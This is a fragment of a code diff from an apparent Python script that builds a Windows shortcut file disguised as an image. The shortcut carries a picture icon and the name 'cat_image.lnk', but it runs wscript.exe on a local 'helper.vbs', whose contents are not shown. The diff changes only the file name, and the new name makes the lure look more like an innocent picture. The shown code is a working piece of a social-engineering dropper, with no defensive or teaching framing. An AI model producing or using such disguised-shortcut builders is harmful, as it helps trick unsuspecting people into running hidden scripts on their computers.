@@ -27,10 +27,10 @@ print("[*] helper.vbs created.")
 # create image.lnk pointing to wscript.exe with helper.vbs
 vbs_path = os.path.abspath("helper.vbs")
 shell = Dispatch("WScript.Shell")
-shortcut = shell.CreateShortCut("image.lnk")
+shortcut = shell.CreateShortCut("cat_image.lnk")
 shortcut.TargetPath = "C:\\Windows\\System32\\wscript.exe"
 shortcut.Arguments = f'"{vbs_path}"'
 shortcut.IconLocation = "C:\\Windows\\System32\\imageres.dll,67"
 shortcut.save()
 
-print("[*] image.lnk created successfully.")
+print("[*] cat_image.lnk created successfully.")
